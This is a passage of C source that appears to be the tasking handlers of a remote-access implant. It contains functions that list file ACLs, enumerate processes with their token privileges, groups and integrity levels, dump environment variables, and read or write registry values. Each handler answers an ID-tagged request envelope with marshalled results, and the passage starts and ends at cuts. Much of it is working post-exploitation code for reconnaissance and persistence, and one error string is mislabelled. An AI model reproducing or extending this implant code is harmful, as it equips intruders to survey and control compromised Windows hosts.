		if (pAceHdr->AceType < SYSTEM_AUDIT_ACE_TYPE || (pAceHdr->AceType > SYSTEM_SCOPED_POLICY_ID_ACE_TYPE && pAceHdr->AceType <= SYSTEM_ACCESS_FILTER_ACE_TYPE)) {
			if (dwMask == 0x1F01FF || dwMask == GENERIC_ALL) {
				if (pAceHdr->AceType == ACCESS_ALLOWED_ACE_TYPE) {
					lpRespData = StrCatExA(lpRespData, "F,");
				}
				else {
					lpRespData = StrCatExA(lpRespData, "N,");
				}

				dwMask = 0;
			}

			if ((dwMask & 0x1301BF) == 0x1301BF) {
				lpRespData = StrCatExA(lpRespData, "M,");
				dwMask &= ~0x1301BF;
			}

			if ((dwMask & 0x1200A9) == 0x1200A9) {
				lpRespData = StrCatExA(lpRespData, "RX,");
				dwMask &= ~0x1200A9;
			}
			else if ((dwMask & 0x120089) == 0x120089) {
				lpRespData = StrCatExA(lpRespData, "R,");
				dwMask &= ~0x120089;
			}

			if ((dwMask & 0x100116) == 0x100116) {
				lpRespData = StrCatExA(lpRespData, "W,");
				dwMask &= ~0x100116;
			}

			if ((dwMask & 0xE0010000) == 0xE0010000) {
				lpRespData = StrCatExA(lpRespData, "M,");
				dwMask &= ~0xE0010000;
			}

			if ((dwMask & 0x110000) == 0x110000) {
				lpRespData = StrCatExA(lpRespData, "D,");
				dwMask &= ~0x110000;
			}
		}
		else if (pAceHdr->AceType == SYSTEM_MANDATORY_LABEL_ACE_TYPE) {
			if (dwMask & 1) {
				lpRespData = StrCatExA(lpRespData, "NW,");
				dwMask &= ~1;
			}

			if (dwMask & 2) {
				lpRespData = StrCatExA(lpRespData, "NR,");
				dwMask &= ~2;
			}

			if (dwMask & 4) {
				lpRespData = StrCatExA(lpRespData, "NX,");
				dwMask &= ~4;
			}
		}

		if ((dwMask & DELETE) == DELETE) {
			lpRespData = StrCatExA(lpRespData, "DE,");
			dwMask &= ~DELETE;
		}

		if ((dwMask & READ_CONTROL) == READ_CONTROL) {
			lpRespData = StrCatExA(lpRespData, "Rc,");
			dwMask &= ~READ_CONTROL;
		}

		if ((dwMask & WRITE_DAC) == WRITE_DAC) {
			lpRespData = StrCatExA(lpRespData, "WDAC,");
			dwMask &= ~WRITE_DAC;
		}

		if ((dwMask & WRITE_OWNER) == WRITE_OWNER) {
			lpRespData = StrCatExA(lpRespData, "WO,");
			dwMask &= ~WRITE_OWNER;
		}

		if ((dwMask & SYNCHRONIZE) == SYNCHRONIZE) {
			lpRespData = StrCatExA(lpRespData, "S,");
			dwMask &= ~SYNCHRONIZE;
		}

		if ((dwMask & ACCESS_SYSTEM_SECURITY) == ACCESS_SYSTEM_SECURITY) {
			lpRespData = StrCatExA(lpRespData, "AS,");
			dwMask &= ~ACCESS_SYSTEM_SECURITY;
		}

		if ((dwMask & MAXIMUM_ALLOWED) == MAXIMUM_ALLOWED) {
			lpRespData = StrCatExA(lpRespData, "MA,");
			dwMask &= ~MAXIMUM_ALLOWED;
		}

		if ((dwMask & GENERIC_READ) == GENERIC_READ) {
			lpRespData = StrCatExA(lpRespData, "GR,");
			dwMask &= ~GENERIC_READ;
		}

		if ((dwMask & GENERIC_WRITE) == GENERIC_WRITE) {
			lpRespData = StrCatExA(lpRespData, "GW,");
			dwMask &= ~GENERIC_WRITE;
		}

		if ((dwMask & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
			lpRespData = StrCatExA(lpRespData, "GE,");
			dwMask &= ~GENERIC_EXECUTE;
		}

		if ((dwMask & GENERIC_ALL) == GENERIC_ALL) {
			lpRespData = StrCatExA(lpRespData, "GA,");
			dwMask &= ~GENERIC_ALL;
		}

		if ((dwMask & FILE_READ_DATA) == FILE_READ_DATA) {
			lpRespData = StrCatExA(lpRespData, "RD,");
			dwMask &= ~FILE_READ_DATA;
		}

		if ((dwMask & FILE_WRITE_DATA) == FILE_WRITE_DATA) {
			lpRespData = StrCatExA(lpRespData, "WD,");
			dwMask &= ~FILE_WRITE_DATA;
		}

		if ((dwMask & FILE_APPEND_DATA) == FILE_APPEND_DATA) {
			lpRespData = StrCatExA(lpRespData, "AD,");
			dwMask &= ~FILE_APPEND_DATA;
		}

		if ((dwMask & FILE_READ_EA) == FILE_READ_EA) {
			lpRespData = StrCatExA(lpRespData, "REA,");
			dwMask &= ~FILE_READ_EA;
		}

		if ((dwMask & FILE_WRITE_EA) == FILE_WRITE_EA) {
			lpRespData = StrCatExA(lpRespData, "WEA,");
			dwMask &= ~FILE_WRITE_EA;
		}

		if ((dwMask & FILE_EXECUTE) == FILE_EXECUTE) {
			lpRespData = StrCatExA(lpRespData, "X,");
			dwMask &= ~FILE_EXECUTE;
		}

		if ((dwMask & FILE_DELETE_CHILD) == FILE_DELETE_CHILD) {
			lpRespData = StrCatExA(lpRespData, "DC,");
			dwMask &= ~FILE_DELETE_CHILD;
		}

		if ((dwMask & FILE_READ_ATTRIBUTES) == FILE_READ_ATTRIBUTES) {
			lpRespData = StrCatExA(lpRespData, "RA,");
			dwMask &= ~FILE_READ_ATTRIBUTES;
		}

		if ((dwMask & FILE_WRITE_ATTRIBUTES) == FILE_WRITE_ATTRIBUTES) {
			lpRespData = StrCatExA(lpRespData, "WA,");
			dwMask &= ~FILE_WRITE_ATTRIBUTES;
		}

		lpRespData[lstrlenA(lpRespData) - 1] = ')';
		lpRespData = StrCatExA(lpRespData, "\n");
		pAceHdr = (PACE_HEADER)((ULONG_PTR)pAceHdr + pAceHdr->AceSize);
	}

	printf("%s\n", lpRespData);
	pFinalElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		FreeBuffer(UnmarshalledData[0]);
		FREE(UnmarshalledData);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (pAcl != NULL) {
		FREE(pAcl);
	}

	if (lpTempPath != NULL) {
		FREE(lpTempPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pRespEnvelope;
}

#define PH_NEXT_PROCESS(Process) ( \
    ((PSYSTEM_PROCESS_INFORMATION)(Process))->NextEntryOffset ? \
    (PSYSTEM_PROCESS_INFORMATION)PTR_ADD_OFFSET((Process), \
    ((PSYSTEM_PROCESS_INFORMATION)(Process))->NextEntryOffset) : \
    NULL \
    )

PENVELOPE PsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PBYTE pProcesses = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcessInfo = NULL;
	PPROCESS_BASIC_INFORMATION pBasicInfo = NULL;
	PPBElement PrivilegeElements[2];
	PPBElement pTokenGroupElements[5];
	PPBElement pTokenElements[8];
	PPBElement pProcessElements[12];
	PPBElement* pElementList = NULL;
	PPBElement* pElementList2 = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList2 = 0x400;
	PIMAGE_VERION pImageVersion = NULL;
	LPSTR lpImagePath = NULL;
	DWORD dwGroupsCount = 0;
	DWORD cbProcesses = 0;
	HANDLE hToken = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD dwIdx = 0;
	LPSTR lpTempStr = NULL;
	HANDLE hProc = NULL;
	DWORD dwArch = 0;
	LPSTR ElevationDescs[] = { NULL, "No (Default)", "No (Full)", "No (Limited)", "Yes", "Yes (Default)", "Yes (Full)", "Yes (Limited))" };
	PTOKEN_INFO pTokenInfo = NULL;
	PTOKEN_GROUP_INFO pGroupInfo = NULL;
	DWORD dwPrivilegeAttr = 0;
	PENVELOPE pRespEnvelope = NULL;
	LPSTR lpErrorDesc = NULL;
	DWORD dwTemp = 0;
	PPBElement pReceivedElement = NULL;
	PUINT64 pUnmarshalledPid = NULL;

	pReceivedElement = ALLOC(sizeof(PBElement));
	pReceivedElement->Type = Varint;
	pReceivedElement->dwFieldIdx = 1;
	pUnmarshalledPid = UnmarshalStruct(&pReceivedElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	pProcesses = EnumProcess(&cbProcesses);
	if (pProcesses == NULL || cbProcesses == 0) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	pElementList2 = ALLOC(sizeof(PPBElement) * cElementList2);
	pProcessInfo = pProcesses;
	do {
		if (pProcessInfo->UniqueProcessId == SYSTEM_IDLE_PROCESS_ID || pProcessInfo->UniqueProcessId == SYSTEM_PROCESS_ID) {
			continue;
		}

		if (pUnmarshalledPid != NULL && pProcessInfo->UniqueProcessId != *pUnmarshalledPid) {
			continue;
		}

		hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pProcessInfo->UniqueProcessId);
		if (hProc == NULL) {
			continue;
		}

		if (dwIdx >= cElementList2) {
			cElementList2 = dwIdx * 2;
			pElementList2 = REALLOC(pElementList2, sizeof(PPBElement) * cElementList2);
		}

		SecureZeroMemory(pProcessElements, sizeof(pProcessElements));
		pBasicInfo = GetProcessBasicInfo(hProc);
		lpTempStr = GetProcessImageFileNameWin32(hProc);
		lpImagePath = DuplicateStrA(lpTempStr, 0);
		pProcessElements[0] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 1);
		FREE(lpTempStr);

		lpTempStr = GetProcessCommandLine(hProc);
		pProcessElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
		FREE(lpTempStr);

		lpTempStr = GetProcessCurrentDirectory(hProc);
		pProcessElements[2] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 3);
		FREE(lpTempStr);

		pProcessElements[3] = CreateVarIntElement((UINT64)pProcessInfo->UniqueProcessId, 4);
		pProcessElements[4] = CreateVarIntElement((UINT64)pBasicInfo->InheritedFromUniqueProcessId, 5);

		lpTempStr = DescribeProcessMitigation(hProc);
		pProcessElements[5] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 6);
		FREE(lpTempStr);

		pImageVersion = GetImageVersion(lpImagePath);
		if (pImageVersion != NULL) {
			if (pImageVersion->lpVersion != NULL) {
				pProcessElements[6] = CreateBytesElement(pImageVersion->lpVersion, lstrlenA(pImageVersion->lpVersion), 7);
			}

			if (pImageVersion->lpCompanyName != NULL) {
				pProcessElements[7] = CreateBytesElement(pImageVersion->lpCompanyName, lstrlenA(pImageVersion->lpCompanyName), 8);
			}

			if (pImageVersion->lpImageDesc != NULL) {
				pProcessElements[8] = CreateBytesElement(pImageVersion->lpImageDesc, lstrlenA(pImageVersion->lpImageDesc), 9);
			}

			if (pImageVersion->lpProductName != NULL) {
				pProcessElements[9] = CreateBytesElement(pImageVersion->lpProductName, lstrlenA(pImageVersion->lpProductName), 10);
			}
		}

		dwArch = GetImageArchitecture(lpImagePath);
		if (dwArch == IMAGE_FILE_MACHINE_I386) {
			pProcessElements[10] = CreateVarIntElement(TRUE, 11);
		}
		else if (dwArch == IMAGE_FILE_MACHINE_AMD64) {
			pProcessElements[10] = CreateVarIntElement(FALSE, 11);
		}

		hToken = NULL;
		if (OpenProcessToken(hProc, TOKEN_READ, &hToken)) {
			pTokenInfo = GetTokenInfo(hProc);
			if (pTokenInfo != NULL) {
				SecureZeroMemory(pTokenElements, sizeof(pTokenElements));
				pTokenElements[2] = CreateVarIntElement(pTokenInfo->dwSession, 3);
				pTokenElements[3] = CreateBytesElement(pTokenInfo->lpUserName, lstrlenA(pTokenInfo->lpUserName), 4);
				if (pUnmarshalledPid != NULL) {
					pTokenElements[0] = CreateVarIntElement(pTokenInfo->IsElevated, 1);
					lpTempStr = DuplicateStrA(ElevationDescs[pTokenInfo->ElevationType + (pTokenInfo->IsElevated ? 4 : 0)], 0);
					pTokenElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
					FREE(lpTempStr);

					pTokenElements[4] = CreateBytesElement(pTokenInfo->lpUserSID, lstrlenA(pTokenInfo->lpUserSID), 5);
					pTokenElements[5] = CreateBytesElement(pTokenInfo->lpIntegrityLevel, lstrlenA(pTokenInfo->lpIntegrityLevel), 6);
					pElementList = ALLOC(pTokenInfo->pPrivileges->PrivilegeCount * sizeof(PPBElement));
					for (i = 0; i < pTokenInfo->pPrivileges->PrivilegeCount; i++) {
						SecureZeroMemory(PrivilegeElements, sizeof(PrivilegeElements));
						for (j = 0; j < _countof(PrivilegeElements); j++) {
							PrivilegeElements[j] = ALLOC(sizeof(PBElement));
							PrivilegeElements[j]->dwFieldIdx = j + 1;
						}

						dwTemp = 0x40;
						lpTempStr = ALLOC(dwTemp);
						LookupPrivilegeNameA(NULL, &pTokenInfo->pPrivileges->Privileges[i].Luid, lpTempStr, &dwTemp);
						PrivilegeElements[0] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 1);
						FREE(lpTempStr);

						dwPrivilegeAttr = pTokenInfo->pPrivileges->Privileges[i].Attributes;
						if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED) {
							if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
								PrivilegeElements[1] = CreateBytesElement("Enabled", lstrlenA("Enabled"), 2);
							}
							else {
								PrivilegeElements[1] = CreateBytesElement("Enabled (modified)", lstrlenA("Enabled (modified)"), 2);
							}
						}
						else {
							if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
								PrivilegeElements[1] = CreateBytesElement("Disabled (modified)", lstrlenA("Disabled (modified)"), 2);
							}
							else {
								PrivilegeElements[1] = CreateBytesElement("Disabled", lstrlenA("Disabled"), 2);
							}
						}

						pElementList[i] = CreateStructElement(PrivilegeElements, _countof(PrivilegeElements), 0);
					}

					pTokenElements[6] = CreateRepeatedStructElement(pElementList, pTokenInfo->pPrivileges->PrivilegeCount, 7);
					FREE(pElementList);
					pElementList = ALLOC(pTokenInfo->dwGroupCount * sizeof(PPBElement));
					for (i = 0; i < pTokenInfo->dwGroupCount; i++) {
						SecureZeroMemory(pTokenGroupElements, sizeof(pTokenGroupElements));
						for (j = 0; j < 5; j++) {
							pTokenGroupElements[j] = ALLOC(sizeof(PBElement));
							pTokenGroupElements[j]->dwFieldIdx = j + 1;
						}

						pGroupInfo = &pTokenInfo->pTokenGroupsInfo[i];
						pTokenGroupElements[0] = CreateBytesElement(pGroupInfo->szName, lstrlenA(pGroupInfo->szName), 1);
						pTokenGroupElements[1] = CreateBytesElement(pGroupInfo->szStatus, lstrlenA(pGroupInfo->szStatus), 2);
						pTokenGroupElements[2] = CreateBytesElement(pGroupInfo->szSID, lstrlenA(pGroupInfo->szSID), 3);
						pTokenGroupElements[3] = CreateBytesElement(pGroupInfo->szDesc, lstrlenA(pGroupInfo->szDesc), 4);
						pTokenGroupElements[4] = CreateBytesElement(pGroupInfo->szMandatoryLabel, lstrlenA(pGroupInfo->szMandatoryLabel), 5);

						pElementList[i] = CreateStructElement(pTokenGroupElements, _countof(pTokenGroupElements), 0);
					}

					pTokenElements[7] = CreateRepeatedStructElement(pElementList, pTokenInfo->dwGroupCount, 8);
					FREE(pElementList);
				}
				
				pProcessElements[11] = CreateStructElement(pTokenElements, _countof(pTokenElements), 12);
			}
		}

		pElementList2[dwIdx++] = CreateStructElement(pProcessElements, _countof(pProcessElements), 0);
		CloseHandle(hProc);
		FREE(lpImagePath);
		FreeImageVersion(pImageVersion);
		FreeTokenInfo(pTokenInfo);
		FREE(pBasicInfo);
	} while (pProcessInfo = PH_NEXT_PROCESS(pProcessInfo));

	pFinalElement = CreateRepeatedStructElement(pElementList2, dwIdx, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (pUnmarshalledPid != NULL) {
		FREE(pUnmarshalledPid);
	}

	if (pReceivedElement != NULL) {
		FREE(pReceivedElement);
	}

	if (pElementList2 != NULL) {
		FREE(pElementList2);
	}

	if (pProcesses != NULL) {
		FREE(pProcesses);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE GetEnvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement* pElementList = NULL;
	PPBElement ElementList2[2];
	PPBElement pElement = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList = 0x100;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPWSTR lpEnvList = NULL;
	LPSTR lpKey = NULL;
	LPSTR lpValue = NULL;
	LPWSTR lpTemp = NULL;
	DWORD cEnvList = 0;
	DWORD cbValue = 0;
	DWORD dwNeededSize = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;
	
	pElementList = ALLOC(cElementList * sizeof(PBElement));
	SecureZeroMemory(ElementList2, sizeof(ElementList2));
	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pTemp == NULL) {
		lpEnvList = GetEnvironmentStringsW();
		while (TRUE) {
			if (lpEnvList[0] != L'=') {
				break;
			}

			lpEnvList += lstrlenW(lpEnvList);
			lpEnvList++;
		}

		lpTemp = lpEnvList;
		while (TRUE) {
			if (lpTemp[0] == L'\0') {
				break;
			}

			lpKey = ConvertWcharToChar(lpTemp);
			lpTemp += lstrlenW(lpTemp) + 1;
			lpValue = StrChrA(lpKey, '=');
			lpValue[0] = '\0';
			lpValue++;
			if (cEnvList >= cElementList) {
				cElementList = 2 * cEnvList;
				pElementList = REALLOC(pElementList, cElementList * sizeof(PBElement));
			}

			ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
			ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
			FREE(lpKey);
			pElementList[cEnvList++] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		}

		pFinalElement = CreateRepeatedStructElement(pElementList, cEnvList, 1);
	}
	else {
		lpKey = pTemp[0]->pBuffer;
		cbValue = 0x400;
		lpValue = ALLOC(cbValue);
		dwNeededSize = GetEnvironmentVariableA(lpKey, lpValue, cbValue);
		if (lstrlenA(lpValue) == 0) {
			lpValue = REALLOC(lpValue, dwNeededSize + 1);
			GetEnvironmentVariableA(lpKey, lpValue, dwNeededSize + 1);
		}

		ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
		ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
		pElementList[0] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		pFinalElement = CreateRepeatedStructElement(pElementList, 1, 1);
		FREE(lpValue);
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	FreeElement(pFinalElement);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpEnvList != NULL) {
		FreeEnvironmentStringsW(lpEnvList);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE RegistryReadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	HKEY hRootKey = NULL;
	LPSTR lpErrorDesc = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	DWORD dwValueType = 0;
	DWORD cbData = 0;
	PBYTE pData = NULL;
	LPSTR lpFormattedValue = NULL;
	LPSTR lpTemp = NULL;
	DWORD cbFormattedValue = 0x400;
	DWORD dwPos = 0;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}
	
	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_READ, &hKey);
	if (Status == ERROR_FILE_NOT_FOUND) {
		FREE(lpTemp);
		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	}
	else if (Status == ERROR_SUCCESS) {
		FREE(lpPath);
		lpPath = lpTemp;
		FREE(lpValueName);
		lpValueName = NULL;
	}
	
	lpTemp = NULL;
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, NULL, &cbData);
	if (Status != ERROR_SUCCESS) {
		if (Status == ERROR_FILE_NOT_FOUND) {
			if (lpValueName == NULL) {
				pData = DuplicateStrA("(value not set)", 0);
			}
			else {
				pData = DuplicateStrA("Registry path not found", 0);
			}

			dwValueType = REG_SZ;
		}
		else {
			lpErrorDesc = CreateFormattedErr(Status, "RegGetValueA failed at %s", __FUNCTION__);
			goto CLEANUP;
		}
	}
	else {
		pData = ALLOC(cbData + 1);
		Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, pData, &cbData);
		if (Status != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(Status, "RegGetValueA failed at %s", __FUNCTION__);
			goto CLEANUP;
		}
	}

	printf("dwValueType: %d\n", dwValueType);
	HexDump(pData, cbData);
	if (dwValueType == REG_BINARY) {
		lpFormattedValue = ALLOC(cbFormattedValue);
		dwPos = 1;
		lpFormattedValue[0] = '[';
		for (i = 0; i < cbData; i++) {
			if (dwPos + 10 >= cbFormattedValue) {
				cbFormattedValue = dwPos * 2;
				lpFormattedValue = REALLOC(lpFormattedValue, cbFormattedValue);
			}

			dwPos += sprintf(&lpFormattedValue[dwPos], "%d ", pData[i]);
		}

		lpFormattedValue[dwPos - 1] = ']';
	}
	else if (dwValueType == REG_SZ || dwValueType == REG_EXPAND_SZ) {
		lpFormattedValue = DuplicateStrA(pData, 0);
	}
	else if (dwValueType == REG_DWORD || dwValueType == REG_QWORD) {
		lpFormattedValue = ALLOC(0x20);
		if (dwValueType == REG_DWORD) {
			sprintf(lpFormattedValue, "0x%08x", *((PDWORD)(pData)));
		}
		else {
			sprintf(lpFormattedValue, "0x%08llx", *((PQWORD)(pData)));
		}
	}
	else if (dwValueType == REG_MULTI_SZ) {
		lpFormattedValue = ALLOC(cbData + 1);
		memcpy(lpFormattedValue, pData, cbData);
		lpTemp = lpFormattedValue;
		while (TRUE) {
			if (lpTemp >= lpFormattedValue + cbData || lpTemp[0] == '\0') {
				break;
			}

			lpTemp += lstrlenA(lpTemp);
			lpTemp[0] = '\n';
			lpTemp++;
		}
	}
	else {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "Invalid value type");
		goto CLEANUP;
	}

	pFinalElement = CreateBytesElement(lpFormattedValue, lstrlenA(lpFormattedValue), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (pData != NULL) {
		FREE(pData);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpFormattedValue != NULL) {
		FREE(lpFormattedValue);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpValueName != NULL) {
		FREE(lpValueName);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryWriteHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[10];
	DWORD i = 0;
	LPVOID* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpErrorDesc = NULL;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwValueType = 0;
	PBYTE pValue = NULL;
	DWORD cbValue = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	RecvElementList[6]->Type = Varint;
	RecvElementList[7]->Type = Varint;
	RecvElementList[9]->Type = Varint;
	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
		goto CLEANUP;
	}

	dwValueType = (DWORD)UnmarshalledData[9];
	if (dwValueType == 1) {
		if (UnmarshalledData[5] == NULL) {
			lpErrorDesc = CreateFormattedErr(0, "Binary value is not provided");
			goto CLEANUP;
		}

		cbValue = ((PBUFFER)UnmarshalledData[5])->cbBuffer;
		pValue = ALLOC(cbValue);
		memcpy(pValue, ((PBUFFER)UnmarshalledData[5])->pBuffer, cbValue);
		dwValueType = REG_BINARY;
	}
	else if (dwValueType == 3) {
		cbValue = sizeof(DWORD);
		pValue = ALLOC(cbValue);
		memcpy(pValue, &UnmarshalledData[6], cbValue);
		dwValueType = REG_DWORD;
	}
	else if (dwValueType == 4) {
		cbValue = sizeof(QWORD);
		pValue = ALLOC(cbValue);
		memcpy(pValue, &UnmarshalledData[7], cbValue);
		dwValueType = REG_QWORD;
	}
	else if (dwValueType == 2) {
		if (UnmarshalledData[4] == NULL) {
			lpErrorDesc = CreateFormattedErr(0, "String value is not provided");
			goto CLEANUP;
		}

		cbValue = ((PBUFFER)UnmarshalledData[4])->cbBuffer + 1;
		pValue = ALLOC(cbValue);
		memcpy(pValue, ((PBUFFER)UnmarshalledData[4])->pBuffer, cbValue);
		dwValueType = REG_SZ;
	}

	lpHive = DuplicateStrA(((PBUFFER)UnmarshalledData[0])->pBuffer, 0);
	lpPath = DuplicateStrA(((PBUFFER)UnmarshalledData[1])->pBuffer, 0);
	lpValueName = DuplicateStrA(((PBUFFER)UnmarshalledData[2])->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
